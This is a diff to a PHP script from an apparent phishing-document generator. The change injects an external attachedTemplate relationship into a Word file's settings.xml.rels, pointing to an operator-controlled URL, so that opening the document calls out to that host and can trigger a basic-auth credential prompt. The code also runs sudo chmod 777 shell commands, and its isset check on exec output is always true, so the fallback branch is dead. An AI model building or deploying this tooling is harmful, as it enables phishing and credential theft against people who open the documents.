@@ -510,8 +510,36 @@ exec ($cmd2,$output2);
 
 if(isset($_REQUEST['basicauth'])){
 
+$cmdchecksettings = "ls /var/www/uploads/word/_rels/ | grep 'settings.xml.rels'";
+exec($cmdchecksettings,$outputchecksettings);
+
+if(isset($outputchecksettings)){
+
+// If settings.xml.rels already exists, append template instead of replacing the file
+$cmdsettingsxmlrelsperms = "sudo chmod 777 /var/www/uploads/word/_rels/settings.xml.rels; sudo chmod 777 /var/www/uploads/word/settings.xml;";
+exec($cmdsettingsxmlrelsperms);
+
+$settingsxmlrels = file_get_contents("/var/www/uploads/word/_rels/settings.xml.rels");
+
+$posrels = strpos($settingsxmlrels, "</Relationships>");
+
+$beforerels = substr($settingsxmlrels, 0, $posrels);
+
+$settingsrelspayload = "<Relationship Id=\"rId9999\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\"
+                        Target=\"HTTPVALUE://URLVALUE/phishingdocs/REPLACEME\"
+                        TargetMode=\"External\"/>";
+
+$settingsrelsfile = "/var/www/uploads/word/_rels/settings.xml.rels";
+$handlerels = fopen($settingsrelsfile, 'w') or die('Cannot open file:  '.$settingsrelsfile);
+$datarels = $beforerels.$settingsrelspayload."</Relationships>";
+fwrite($handlerels, $datarels);
+
+} else {
+
 $cmdbasicauthtemplate = "sudo cp settings.xml.rels.TEMPLATE /var/www/uploads/word/_rels/settings.xml.rels; sudo chmod 777 /var/www/uploads/word/settings.xml";
 exec ($cmdbasicauthtemplate);
+
+}
 
 $basicauthurl = "?target=".stripslashes($Target)."\&amp;org=".stripslashes($Org)."\&amp;id=".stripslashes($uniqueid)."\&amp;auth=1";
 
